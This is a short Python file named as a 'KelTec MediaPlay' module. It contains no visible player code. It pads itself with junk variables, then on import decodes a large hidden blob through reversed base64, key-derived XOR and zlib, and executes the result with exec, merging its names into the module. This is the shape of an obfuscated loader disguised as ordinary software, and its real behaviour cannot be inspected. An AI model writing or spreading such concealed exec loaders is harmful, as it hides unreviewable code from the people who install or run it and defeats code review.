# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 680877 ^ 183675
_lx1_1 = len("83a710")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-361315)
_lx3_3 = 923968 * 0
_lx4_4 = 837406 ^ 709554
_K = '1280135b41aa29c67cfb2207ce1317d993798033619103a9259e2d1bfe632801'
_M = 'FRpERgOXuEsPqw=='
_D = '0zvT8VIFHSsjigeyNqf7aNIb2YKPBaFxrc0ERzvC7gQpr23L+ldUMQvMOetHy+Eh4xBpFq0izXNr/9ULKKeX/Eu4pcstitfarVGwOoizX2SvlRmMMgF9JSomwKsSoBdcxxOHP1gWPzMPq3aVKl5rihwPKPUbHGxgZ1vdeYiLMX4YoacK1LDxdM46SEEKfGZp38w9fyF0jE9U6eG8/ysKCKiPWOiXDhtN5RS0EmbMRyZA2vU2LdYOI2vXpVQ1PHcfuVSvdvGhB6QhcZMuCkyVGfrR/+FL4S3gBECHfLvKhswjwBdeyFrGHKcS/hjXNqDB++rHi+GY/W8PeL7OQOBKDohy/llIjV6/GQ4Yd0lrbbE15C9CNT6iGtg/hW/M09aRxJoTn6oZ9nAbnVX5hFJFemTklilqtTAzRMRr5pL76V1hQNtWmHAELI1xtT9DqMxDWh1fwKJs3ZNV/E67SyimdcLniqr7rdjl8xu7KpoW9gLZsp6hxDAS364NSkN64HIOBC0w0JkZowGV2999Ib4eDaXzyKU03qH2Jf3XAeVhxnfsUsjG7eaXMzOsvzDPbEkmW3wQnTRkBQHBvDufnEj5AKwANi8WGzx3LZozUj1uf+DwDSWlp64DjhRSZFsBxfZ5jHjLQVb50FWmP61kepq6kDr+nb+D+bboroeGtmDIHVdeK1Rs3aVT7U6qsD+dbBnOJMovKDey/koocHTDjPo0nFDo18S1aI2KKpSQCdCfCrLgduELy25lvFrOlsQVFcx4/3fLN04QMvNaE5EU32KvHV1887UuHhFE5OGqZdFOfTCo4Ejc78Pl1YtJM7XFKEfa7Vic6TvFRBHXs8cQWQZ3gXefqZ/aOk8TjD+MWwFAlLLyv5miB0zZv0uuFzhFS9nx6REPEuW8gGrQhqdHDdLqmM9quF/6EkkIY6RFIB6+k7oRlqYgpW2pbClhJOLgOO1k0nUKM59G9YvmvWveUk1ojDb+zbeDbW5sZvV6MF6bJMXUIqb7G/qT3SV5vouIFQc4QwJcZleIMBBpMSRqv3+vjW07NdIC+gG4KodmnGYNH8GJcopD9au3bl8MihVhVb4YCgN10DpawehkhGkGn02cbM0ABTMC6YL1LIu54KEaz1Nb1+bofkphYHachPjoNwKQTToDYWFzsFhAppTgn1LKUqHuJzUxnxhd8lmN4/ZjxxZ9xQGt07UIJP/X71Ed4oS5AzvimSCMl+lOldDRmq+J/eZ68Wbxzrfm1VFkvIm5gEGxThl6GeWi46e6SIzxGgWrV35DRXxTyeaD2SQYuQAuHdxH4QzF7qMnXFV93v4fWVZmxmdzozXOCg2M7zlKRksSyXzTiaKT45a9fs+WLgrKbyaagm2n0P78NViiZp0Dt04W7+45IUKCfSMJH7yQ59zU1HUBXynUPH3ebTstXCBf82Dr336hQmDuN5UcDUgiCL+vAcH4T1mGBqT0r0hceDZYFWAMm/lAUWOWiJM6H2nXMN/dKClBDLAdM4r9Ic4HlF/dgmn90KRjZz0qEAtXL5CNDs5rnuNYXftzYGsAsrLHuh6wqhlMh3wGTYZOV0QrsuPLXXHCgr/jw93HJhGHBi/3HI9MU0/Y0P8QLdhOV1NrLK90vKw/LWKcEJuxIvWbDuwXUh3O5sr4nXEA2XB9pbm3CO9iZWvhZA2sfak91N50LDks+Gyg4q7ivzUOcQkxE1gkWagUYQW+HgsgBmE0O0Q+phci/HbuldmSU4CFpxs7DaMwRXBDWTIIpEtVmrbk4iNVBcwClPz7rShGbVK/2K2JPcT9FJGvPKX8wktYZo95n2r4'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})
